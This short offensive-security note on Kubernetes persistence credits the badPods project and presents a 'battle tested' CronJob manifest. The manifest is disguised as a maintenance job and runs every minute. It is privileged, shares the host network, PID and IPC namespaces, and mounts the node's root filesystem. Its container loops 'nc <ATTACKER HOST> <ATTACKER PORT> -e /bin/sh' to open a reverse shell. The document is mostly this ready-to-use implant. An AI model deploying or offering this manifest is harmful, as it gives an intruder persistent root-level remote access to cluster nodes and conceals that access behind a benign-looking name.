# Kubernetes - Persistence 

> Core idea is coming from [BishopFox/badPods](https://github.com/BishopFox/badPods/) and is a collection of manifests that create pods with different elevated privileges. Quickly demonstrate the impact of allowing security sensitive pod attributes like hostNetwork, hostPID, hostPath, hostIPC, and privileged.


<img height="100" src="https://github.com/BishopFox/badPods/raw/main/.github/images/Title.jpg"></img>

An enhanced variant that was battle tested:
```yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: maintenance-service-dailyjob
  namespace: mayhem
  labels:
    app: maintenance-service
spec:
  schedule: "*/1 * * * *"
  concurrencyPolicy: Forbid
  jobTemplate:
    spec:
      template:
        spec:
          hostNetwork: true
          hostPID: true
          hostIPC: true
          containers:
          - name: maintenance-service-dailyjob
            image: nginx:alpine
            command: ["/bin/sh", "-c", "-"]
            args: ["while true; do nc <ATTACKER HOST> <ATTACKER PORT> -e /bin/sh | sleep 10; done"]
            securityContext:
              privileged: true
            volumeMounts:
            - mountPath: /host
              name: noderoot
          volumes:
          - name: noderoot
            hostPath:
              path: /
          restartPolicy: OnFailure
```
